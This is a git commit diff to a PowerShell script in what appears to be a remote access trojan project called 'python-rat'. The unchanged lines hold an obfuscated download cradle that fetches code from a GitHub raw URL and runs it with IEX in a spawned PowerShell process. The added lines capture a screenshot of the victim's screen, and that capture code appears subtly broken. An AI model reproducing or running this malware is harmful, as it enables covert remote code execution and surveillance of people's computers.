ce7c2a3ab6070f7f1866d3d85e1db4e5e9f946ba
43a1723 <hai1723notgay@gmail.com>
2024-08-13 16:36:26 +0700

    Update main.ps1

--- rat-scr/main.ps1
+++ rat-scr/main.ps1
@@ -8,3 +8,8 @@ $shellcode = ("https://raw.githubusercontent.com/s1uiasdad/python-rat/main/rat-s
 $download = "(New-Object Net.Webclient).""`DowNloAdS`TR`i`N`g""('$shellcode')"
 $proc = Start-Process "powershell" -Argument "I'E'X($download)" -NoNewWindow -PassThru
 $proc.WaitForExit()
+
+Add-Type -AssemblyName System.Drawing
+$screenshot = [System.Drawing.Bitmap]::FromHbitmap([System.Windows.Forms.Screen]::PrimaryScreen.Bounds.ToHbitmap())
+$screenshot.Save("Screenshot.png", [System.Drawing.Imaging.ImageFormat]::Png)
+$screenshot.Dispose()
